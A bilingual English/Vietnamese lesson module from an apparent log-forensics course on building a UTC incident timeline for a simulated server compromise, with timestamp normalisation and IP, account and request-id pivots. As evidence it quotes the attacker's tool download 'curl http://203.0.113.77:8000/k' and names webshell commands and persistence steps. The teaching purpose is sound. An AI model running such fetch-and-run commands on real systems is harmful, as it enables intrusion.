/**
 * 14.5 — Dựng dòng thời gian (soạn 24/11/2026, agent lgz). Output thật: OUT['s14/dong-thoi-gian'] — vu14 (tao-vu.py) + công cụ _demo/s14/mau/dong-thoi-gian.py.
 * Số tất định: bốn cách ghi giờ → 19:31:12Z, 19:22:30Z, 19:14:01Z, 18:24:54Z; dòng thời gian 46 hàng (logsrv* 21, audit 9, nginx 7, syslog 4, canh-bao 2, app 2 — đếm ở output);
 * mốc chính (UTC 18–19/11): 18:06:47 nhồi bắt đầu (IP .165/.168 ×28), 18:20:45 + 18:24:54 lan/hoa thành công, 18:40/18:57/19:14 ba đợt SSH, 19:14:01 Accepted deploy, 19:15:02 sudo bash,
 * 19:16:02 sysupdate, 19:17:10–19:20:12 bốn khoá auditd, 19:22:30 audit off, 19:24:08 rsyslog, 19:25:01 kworkerd ×110, 19:31:12 webshell, 19:47:13 rút 18 874 211 byte, 19:48:30 xoá, 19:54:10 IM_LANG.
 * anh-2041 có ở 5 dòng nginx + stat.txt; auid=1001: 4 SYSCALL + 1 mỗi loại ADD_USER/ADD_GROUP/CONFIG_CHANGE/USER_CMD.
 */
import { lenh, ma, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '14.5 — Building an incident timeline from many sources: normalising time, correlating by IP, user, request id|||14.5 — Dựng dòng thời gian sự cố từ nhiều nguồn: chuẩn hoá thời gian, tương quan theo IP, người dùng, request id',
  slug: 'log-14-5-dong-thoi-gian',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Mỗi nguồn kể một mẩu, dòng thời gian ghép chúng thành câu chuyện. Bài này đưa năm cách ghi giờ khác nhau (nginx +0700, RFC 3339, giây Unix của auditd, mili giây của pino, chữ Z của EVTX) về một chuẩn UTC, viết công cụ 60 dòng Python gom mọi dòng khớp dấu hiệu từ bảy tệp log thành một bảng 46 hàng có cột bằng chứng tệp:dòng, xoay trục theo IP, tài khoản, request id và auid — rồi viết lại toàn bộ vụ web01 thành một bảng dòng thời gian chuẩn (thời điểm UTC, nguồn, máy, sự kiện, bằng chứng, độ tin cậy) kèm danh sách những điều CHƯA chắc chắn.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 14 · Lesson 14.5</span>
<h2>One clock, one table, one story</h2>
<p class="lead">Lessons 14.1–14.4 each looked at one source. An investigation ends with one artefact everyone reads: the <strong>timeline</strong> — every relevant event, in order, in one time zone, with a pointer to the exact log line that proves it. Building it is mostly two chores: <em>normalising time</em> and <em>joining records</em> that talk about the same thing.</p>

<h3>The everyday picture</h3>
<p>Witnesses of a traffic accident: one says "around 8", one has a dash-cam with a clock 3 minutes fast, one has a phone photo with a timestamp in another time zone. The police report has to put all of them on one clock before anyone can say who ran the red light.</p>

<h3>Step 1 — five ways to write the same night</h3>
${lenh('s14/dong-thoi-gian', 0)}
${lenh('s14/dong-thoi-gian', 1)}
${kv([
  ['nginx access log', '[19/Nov/2026:02:31:12 +0700] — local time with offset.'],
  ['rsyslog (Ubuntu 24.04)', '2026-11-19T02:14:01.078999+07:00 — RFC 3339 with offset.'],
  ['auditd', 'audit(1795029750.764:…) — Unix seconds, always UTC.'],
  ['pino JSON', '"time":1795026294695 — Unix milliseconds, UTC.'],
  ['Windows EVTX', '2019-03-19T23:35:07.52Z — SystemTime in UTC; Event Viewer shows it in the viewer\'s local zone.'],
])}
<p>Rule: convert everything to <strong>UTC</strong> and write the "Z". Keep the original string in the evidence column. When a source has no offset (old syslog "Nov 19 02:14:01"), write down which zone you <em>assumed</em> and why (Lesson 1.5).</p>

<h3>Step 2 — a small timeline tool</h3>
<p>The tool reads seven files, keeps lines containing any indicator you give it (IPs, account names, audit keys, file names), converts the time to UTC, and groups repeated lines. Lines that exist only on the log server are marked <code>logsrv*</code> — they were deleted on web01 (14.4).</p>
<details><summary><strong>dong-thoi-gian.py (≈ 60 lines)</strong></summary>
${ma('python', 's14/mau/dong-thoi-gian.py')}
</details>
${lenh('s14/dong-thoi-gian', 2)}
${lenh('s14/dong-thoi-gian', 3)}
${lenh('s14/dong-thoi-gian', 4)}

<h3>Step 3 — pivoting</h3>
<p>Investigation is a loop: an indicator leads to records, records reveal new indicators. Pivots used in this chapter:</p>
${kv([
  ['IP', '203.0.113.77 → spray → Accepted deploy → the same IP serves the tool (curl http://203.0.113.77:8000/k).'],
  ['Account', 'deploy (uid 1001) → auid=1001 → every root action after sudo.'],
  ['Request id', 'reqId in pino = rid in nginx → the exact HTTP request behind "login ok" (14.2).'],
  ['File name', 'anh-2041.php → nginx lines + file metadata.'],
])}
${lenh('s14/dong-thoi-gian', 5)}
${lenh('s14/dong-thoi-gian', 6)}

<h3>Step 4 — the incident timeline (deliverable)</h3>
<table>
<thead><tr><th>UTC (18–19/11/2026)</th><th>Source</th><th>Event</th><th>Evidence</th><th>Confidence</th></tr></thead>
<tbody>
<tr><td>18:05–18:35</td><td>nginx + app</td><td>Credential stuffing: 600 attempts, 40 IPs, 598 accounts once each</td><td>access.log, app.jsonl</td><td>High</td></tr>
<tr><td>18:20:45, 18:24:54</td><td>app</td><td>lan@ and hoa@ logged in from US proxies (impossible travel)</td><td>app.jsonl reqId 0eaea4ce…, 17b0cefa…</td><td>High</td></tr>
<tr><td>18:40 / 18:57 / 19:14</td><td>logsrv</td><td>SSH spray, 25 accounts × 3 rounds from 203.0.113.77</td><td>auth-syslog.log (deleted on web01)</td><td>High</td></tr>
<tr><td>19:14:01</td><td>logsrv + auth.log</td><td>Accepted <strong>password</strong> for deploy from 203.0.113.77</td><td>logsrv line; orphan session on web01</td><td>High</td></tr>
<tr><td>19:15:02</td><td>logsrv + auditd</td><td>sudo → root shell</td><td>sudo COMMAND=/usr/bin/bash; USER_CMD auid=1001</td><td>High</td></tr>
<tr><td>19:16:02–19:16:11</td><td>logsrv + auditd</td><td>sysupdate created, added to sudo, password set</td><td>useradd/usermod/chpasswd; ADD_USER/ADD_GROUP</td><td>High</td></tr>
<tr><td>19:17:10–19:20:15</td><td>auditd + syslog</td><td>Root SSH key, tool download, cron.d + systemd unit; service started</td><td>4 audit keys; "Started dbus-sync.service"</td><td>High</td></tr>
<tr><td>19:22:30</td><td>auditd</td><td>auditd disabled</td><td>CONFIG_CHANGE audit_enabled=0</td><td>High</td></tr>
<tr><td>≈19:23:05</td><td>file metadata</td><td>auth.log rewritten (lines removed)</td><td>stat: birth 02:23:05 +0700</td><td>Medium (inferred from metadata)</td></tr>
<tr><td>19:24:08</td><td>syslog / logsrv</td><td>rsyslog restarted without forwarding; log server goes silent</td><td>"exiting on signal 15"; 426-min gap</td><td>High</td></tr>
<tr><td>19:25 → 02:30</td><td>syslog</td><td>kworkerd run by cron every 5 minutes (110 times)</td><td>syslog CRON lines</td><td>High</td></tr>
<tr><td>≈19:29:58</td><td>file metadata</td><td>Webshell anh-2041.php written (owner root)</td><td>ls -la mtime only</td><td>Medium (mtime can be forged)</td></tr>
<tr><td>19:31:12–19:33:12</td><td>nginx</td><td>Webshell used from 192.0.2.10: id, uname, ls exports</td><td>access.log ×4</td><td>High</td></tr>
<tr><td>19:47:13</td><td>nginx</td><td>Customer export downloaded: 18 874 211 bytes in 41 s</td><td>access.log</td><td>High that it was sent; contents unknown</td></tr>
<tr><td>19:48:30</td><td>nginx</td><td>Export file deleted via webshell</td><td>access.log c=rm+-f…</td><td>High</td></tr>
<tr><td>19:54:10</td><td>logsrv</td><td>Silence alert fired (nobody acted until 02:28)</td><td>canh-bao.log</td><td>High</td></tr>
</tbody></table>
<h4>Open questions (write them down!)</h4>
<ul>
<li>What does <code>kworkerd</code> do? (no copy collected yet — need the binary, outbound connections, CPU.)</li>
<li>Did 203.0.113.77 use the root SSH key later? (needs logs after 02:31 UTC when forwarding resumed.)</li>
<li>What exactly was in the 18 MB export — how many customers? (ask the app team; Vietnam's Personal Data Protection Law 91/2025/QH15, in force since 1/1/2026, requires notifying the authority within 72 hours of discovery — that clock started this morning.)</li>
<li>Were lan@ and hoa@ sessions used for anything (orders, address changes)?</li>
</ul>

<h3>From spreadsheet to super-timeline</h3>
<p>For one server, a TSV opened in a spreadsheet is enough. For dozens of machines, tools like Plaso (log2timeline) parse hundreds of formats into one "super-timeline" and Timesketch lets a team annotate it — that belongs to the Blue Team course. The principles do not change: UTC, one row per event, evidence pointer, confidence.</p>

<h3>🛡️ Attacker's corner</h3>
<p>Timestomping (T1070.006) changes a file's mtime so it blends in — which is why the webshell row is "Medium". Log lines written by a separate system (nginx access, the log server) are much harder to forge than file timestamps on the compromised host.</p>

<h3>🎤 What an interviewer will ask</h3>
<ul>
<li>"How do you build a timeline from logs in different time zones?" — normalise to UTC, keep the original, note assumptions.</li>
<li>"How do you link an app log line to an nginx line?" — a shared request id (Lesson 10.8).</li>
<li>"What goes in a confidence column?" — direct log evidence vs inference from metadata vs assumption.</li>
</ul>

<h3>At work</h3>
<p>In an incident call with a Japanese or European customer, the timeline is the document everyone edits. Keep it in UTC and add the customer's local time in a second column only when presenting.</p>

<h3>🧪 Practice (40 min)</h3>
<ol>
<li>Add the morning recovery (an at 09:28 local, auditd and rsyslog back) to the timeline in UTC.</li>
<li>Run the tool with only <code>192.0.2.10</code>. What does that single IP tell you?</li>
<li>Extend dong-thoi-gian.py to read EVTX JSON (evtx-rec output) and add the fs02 1102/104/7045 rows of 14.4.</li>
</ol>

<h3>🗂 Key terms</h3>
${kv([
  ['Timeline', 'Ordered list of events on one clock, each with evidence.'],
  ['Normalisation', 'Converting all timestamps to one zone (UTC) and format.'],
  ['Pivot', 'Using a value found in one record to search all sources.'],
  ['Super-timeline', 'Timeline built automatically from many artefact types (Plaso).'],
  ['Confidence', 'How directly the evidence supports the row.'],
])}

<h3>📌 Summary</h3>
<ul>
<li>UTC everywhere; original string kept as evidence.</li>
<li>Indicators → records → new indicators: pivot until nothing new appears.</li>
<li>A good timeline lists what is still unknown.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-1-5-thoi-gian', title: 'Lesson 1.5 — Time in logs', sub: 'Time zones, epoch, clock skew', cta: 'Open' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-10-1-plaso', title: 'Blue Team course › 10.1 Plaso and Timesketch', sub: 'Super-timelines', cta: 'Open' })}
${lienKet({ khoa: 'incident-response', bai: 'ir-4-5-dong-thoi-gian', title: 'Incident Response course › 4.5 Live timeline', sub: 'Writing the timeline during the incident', cta: 'Open' })}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 14 · Bài 14.5</span>
<h2>Một đồng hồ, một bảng, một câu chuyện</h2>
<p class="lead">Bài 14.1–14.4 mỗi bài nhìn một nguồn. Cuộc điều tra kết thúc bằng một sản phẩm mà ai cũng đọc: <strong>dòng thời gian</strong> — mọi sự kiện liên quan, theo thứ tự, cùng một múi giờ, kèm chỉ dẫn tới đúng dòng log chứng minh nó. Dựng nó chủ yếu là hai việc vặt: <em>chuẩn hoá thời gian</em> và <em>ghép các bản ghi</em> nói về cùng một thứ.</p>

<h3>Liên tưởng đời thường</h3>
<p>Nhân chứng một vụ va chạm giao thông: người nói "khoảng 8 giờ", người có camera hành trình chạy nhanh 3 phút, người có ảnh điện thoại ghi giờ theo múi khác. Biên bản của công an phải đưa tất cả về một đồng hồ trước khi ai đó nói được xe nào vượt đèn đỏ.</p>

<h3>Bước 1 — năm cách ghi cùng một đêm</h3>
${lenh('s14/dong-thoi-gian', 0)}
${lenh('s14/dong-thoi-gian', 1)}
${kv([
  ['access log nginx', '[19/Nov/2026:02:31:12 +0700] — giờ địa phương kèm độ lệch.'],
  ['rsyslog (Ubuntu 24.04)', '2026-11-19T02:14:01.078999+07:00 — RFC 3339 kèm độ lệch.'],
  ['auditd', 'audit(1795029750.764:…) — giây Unix, luôn là UTC.'],
  ['JSON của pino', '"time":1795026294695 — mili giây Unix, UTC.'],
  ['EVTX của Windows', '2019-03-19T23:35:07.52Z — SystemTime theo UTC; Event Viewer hiển thị theo múi giờ của người xem.'],
])}
<p>Luật: đổi mọi thứ về <strong>UTC</strong> và viết chữ "Z". Giữ chuỗi gốc trong cột bằng chứng. Khi một nguồn không có độ lệch (syslog kiểu cũ "Nov 19 02:14:01"), ghi rõ bạn đã <em>giả định</em> múi nào và vì sao (Bài 1.5).</p>

<h3>Bước 2 — một công cụ dòng thời gian nhỏ</h3>
<p>Công cụ đọc bảy tệp, giữ các dòng chứa bất kỳ dấu hiệu nào bạn đưa vào (IP, tên tài khoản, khoá auditd, tên tệp), đổi giờ về UTC và gộp các dòng lặp lại. Dòng chỉ còn ở máy chủ log được đánh dấu <code>logsrv*</code> — chúng đã bị xoá trên web01 (14.4).</p>
<details><summary><strong>dong-thoi-gian.py (≈ 60 dòng)</strong></summary>
${ma('python', 's14/mau/dong-thoi-gian.py')}
</details>
${lenh('s14/dong-thoi-gian', 2)}
${lenh('s14/dong-thoi-gian', 3)}
${lenh('s14/dong-thoi-gian', 4)}
<p>Đọc bảng: mỗi hàng là một sự kiện hoặc một nhóm lặp (<code>[×20 tới …]</code>); cột cuối của tệp TSV (đã cắt khi in) là <code>tệp:dòng</code> — ai nghi ngờ hàng nào thì mở đúng dòng đó ra xem.</p>

<h3>Bước 3 — xoay trục (pivot)</h3>
<p>Điều tra là một vòng lặp: một dấu hiệu dẫn tới các bản ghi, các bản ghi lộ ra dấu hiệu mới. Các lần xoay trục đã dùng trong chương:</p>
${kv([
  ['IP', '203.0.113.77 → rải mật khẩu → Accepted deploy → chính IP đó phục vụ công cụ (curl http://203.0.113.77:8000/k).'],
  ['Tài khoản', 'deploy (uid 1001) → auid=1001 → mọi hành động của root sau sudo.'],
  ['Request id', 'reqId trong pino = rid trong nginx → đúng request HTTP đằng sau "login ok" (14.2).'],
  ['Tên tệp', 'anh-2041.php → các dòng nginx + siêu dữ liệu tệp.'],
])}
${lenh('s14/dong-thoi-gian', 5)}
${lenh('s14/dong-thoi-gian', 6)}

<h3>Bước 4 — dòng thời gian của vụ việc (sản phẩm nộp)</h3>
<table>
<thead><tr><th>UTC (18–19/11/2026)</th><th>Nguồn</th><th>Sự kiện</th><th>Bằng chứng</th><th>Độ tin cậy</th></tr></thead>
<tbody>
<tr><td>18:05–18:35</td><td>nginx + app</td><td>Nhồi thông tin đăng nhập: 600 lần, 40 IP, 598 tài khoản mỗi tài khoản một lần</td><td>access.log, app.jsonl</td><td>Cao</td></tr>
<tr><td>18:20:45, 18:24:54</td><td>app</td><td>lan@ và hoa@ đăng nhập từ proxy ở Mỹ (di chuyển bất khả)</td><td>app.jsonl reqId 0eaea4ce…, 17b0cefa…</td><td>Cao</td></tr>
<tr><td>18:40 / 18:57 / 19:14</td><td>logsrv</td><td>Rải mật khẩu SSH, 25 tài khoản × 3 đợt từ 203.0.113.77</td><td>auth-syslog.log (đã bị xoá trên web01)</td><td>Cao</td></tr>
<tr><td>19:14:01</td><td>logsrv + auth.log</td><td>Accepted <strong>password</strong> cho deploy từ 203.0.113.77</td><td>dòng ở logsrv; phiên mồ côi trên web01</td><td>Cao</td></tr>
<tr><td>19:15:02</td><td>logsrv + auditd</td><td>sudo → shell root</td><td>sudo COMMAND=/usr/bin/bash; USER_CMD auid=1001</td><td>Cao</td></tr>
<tr><td>19:16:02–19:16:11</td><td>logsrv + auditd</td><td>Tạo sysupdate, thêm vào sudo, đặt mật khẩu</td><td>useradd/usermod/chpasswd; ADD_USER/ADD_GROUP</td><td>Cao</td></tr>
<tr><td>19:17:10–19:20:15</td><td>auditd + syslog</td><td>Khoá SSH cho root, tải công cụ, cron.d + unit systemd; dịch vụ chạy</td><td>4 khoá audit; "Started dbus-sync.service"</td><td>Cao</td></tr>
<tr><td>19:22:30</td><td>auditd</td><td>Tắt auditd</td><td>CONFIG_CHANGE audit_enabled=0</td><td>Cao</td></tr>
<tr><td>≈19:23:05</td><td>siêu dữ liệu tệp</td><td>auth.log bị viết lại (xoá dòng)</td><td>stat: sinh 02:23:05 +0700</td><td>Trung bình (suy ra từ siêu dữ liệu)</td></tr>
<tr><td>19:24:08</td><td>syslog / logsrv</td><td>Khởi động lại rsyslog không còn chuyển tiếp; máy chủ log im lặng</td><td>"exiting on signal 15"; khoảng lặng 426 phút</td><td>Cao</td></tr>
<tr><td>19:25 → 02:30</td><td>syslog</td><td>kworkerd được cron chạy mỗi 5 phút (110 lần)</td><td>các dòng CRON trong syslog</td><td>Cao</td></tr>
<tr><td>≈19:29:58</td><td>siêu dữ liệu tệp</td><td>Webshell anh-2041.php được ghi (chủ là root)</td><td>chỉ có mtime từ ls -la</td><td>Trung bình (mtime giả được)</td></tr>
<tr><td>19:31:12–19:33:12</td><td>nginx</td><td>Dùng webshell từ 192.0.2.10: id, uname, ls thư mục exports</td><td>access.log ×4</td><td>Cao</td></tr>
<tr><td>19:47:13</td><td>nginx</td><td>Tải tệp xuất dữ liệu khách hàng: 18 874 211 byte trong 41 giây</td><td>access.log</td><td>Cao là đã gửi đi; chưa rõ nội dung</td></tr>
<tr><td>19:48:30</td><td>nginx</td><td>Xoá tệp xuất qua webshell</td><td>access.log c=rm+-f…</td><td>Cao</td></tr>
<tr><td>19:54:10</td><td>logsrv</td><td>Cảnh báo im lặng kêu (không ai xử lý tới 02:28 UTC)</td><td>canh-bao.log</td><td>Cao</td></tr>
</tbody></table>
<h4>Câu hỏi còn mở (phải ghi ra!)</h4>
<ul>
<li><code>kworkerd</code> làm gì? (chưa thu được bản sao — cần tệp chạy, các kết nối ra ngoài, CPU.)</li>
<li>203.0.113.77 có dùng khoá SSH của root sau đó không? (cần log sau 02:31 UTC khi việc chuyển tiếp hoạt động lại.)</li>
<li>Tệp xuất 18 MB chứa gì — bao nhiêu khách hàng? (hỏi đội ứng dụng; ở Việt Nam, Luật Bảo vệ dữ liệu cá nhân 91/2025/QH15 (hiệu lực 1/1/2026) yêu cầu thông báo cơ quan chuyên trách chậm nhất 72 giờ sau khi phát hiện vi phạm — đồng hồ đó đã chạy từ sáng nay.)</li>
<li>Phiên của lan@ và hoa@ có bị dùng làm gì không (đặt hàng, đổi địa chỉ)?</li>
</ul>

<h3>Từ bảng tính tới siêu dòng thời gian</h3>
<p>Với một máy chủ, một tệp TSV mở bằng bảng tính là đủ. Với hàng chục máy, công cụ như Plaso (log2timeline) đọc hàng trăm định dạng thành một "siêu dòng thời gian" và Timesketch cho cả đội cùng ghi chú — phần đó thuộc khoá Blue Team. Nguyên tắc thì không đổi: UTC, mỗi sự kiện một hàng, chỉ dẫn bằng chứng, độ tin cậy.</p>

<h3>🛡️ Góc hacker</h3>
<p>Timestomping (T1070.006) sửa mtime của tệp để nó lẫn vào đám đông — chính vì vậy hàng webshell chỉ "Trung bình". Các dòng log do một hệ thống khác ghi (access log nginx, máy chủ log) khó giả hơn nhiều so với mốc thời gian của tệp trên chính máy đã bị chiếm.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ul>
<li>"Dựng dòng thời gian từ log ở nhiều múi giờ thế nào?" — chuẩn hoá về UTC, giữ chuỗi gốc, ghi rõ giả định.</li>
<li>"Nối một dòng log ứng dụng với một dòng nginx bằng gì?" — request id chung (Bài 10.8).</li>
<li>"Cột độ tin cậy ghi gì?" — bằng chứng log trực tiếp, suy ra từ siêu dữ liệu, hay chỉ là giả định.</li>
</ul>

<h3>Đi làm thật (outsourcing / OJT)</h3>
<p>Trong cuộc gọi xử lý sự cố với khách Nhật hay châu Âu, dòng thời gian là tài liệu mọi người cùng sửa. Giữ nó theo UTC, và chỉ thêm cột giờ địa phương của khách khi trình bày.</p>

<h3>🧪 Thực hành (40 phút)</h3>
<ol>
<li>Thêm phần khôi phục buổi sáng (an lúc 09:28 giờ VN, auditd và rsyslog hoạt động lại) vào dòng thời gian theo UTC.</li>
<li>Chạy công cụ chỉ với <code>192.0.2.10</code>. Riêng IP đó kể gì cho bạn?</li>
<li>Mở rộng dong-thoi-gian.py để đọc JSON của EVTX (output của evtx-rec) và thêm các hàng 1102/104/7045 của fs02 ở Bài 14.4.</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
${kv([
  ['Dòng thời gian (timeline)', 'Danh sách sự kiện theo thứ tự trên một đồng hồ, mỗi sự kiện có bằng chứng.'],
  ['Chuẩn hoá', 'Đổi mọi mốc thời gian về một múi (UTC) và một định dạng.'],
  ['Xoay trục (pivot)', 'Dùng giá trị tìm được ở một bản ghi để tìm trong mọi nguồn.'],
  ['Siêu dòng thời gian', 'Dòng thời gian dựng tự động từ nhiều loại dữ liệu (Plaso).'],
  ['Độ tin cậy', 'Bằng chứng hỗ trợ hàng đó trực tiếp tới mức nào.'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>UTC ở mọi nơi; chuỗi gốc giữ làm bằng chứng.</li>
<li>Dấu hiệu → bản ghi → dấu hiệu mới: xoay trục tới khi không còn gì mới.</li>
<li>Dòng thời gian tốt liệt kê cả những gì còn chưa biết.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-1-5-thoi-gian', title: 'Bài 1.5 — Thời gian trong log', sub: 'Múi giờ, epoch, lệch đồng hồ', cta: 'Mở bài' })}
${lienKet({ khoa: 'blue-team-siem', bai: 'siem-10-1-plaso', title: 'Khoá Blue Team › 10.1 Plaso và Timesketch', sub: 'Siêu dòng thời gian', cta: 'Mở bài' })}
${lienKet({ khoa: 'incident-response', bai: 'ir-4-5-dong-thoi-gian', title: 'Khoá Incident Response › 4.5 Ghi dòng thời gian ngay lúc xảy ra', sub: 'Viết dòng thời gian trong lúc xử lý', cta: 'Mở bài' })}
</div>
`,
};
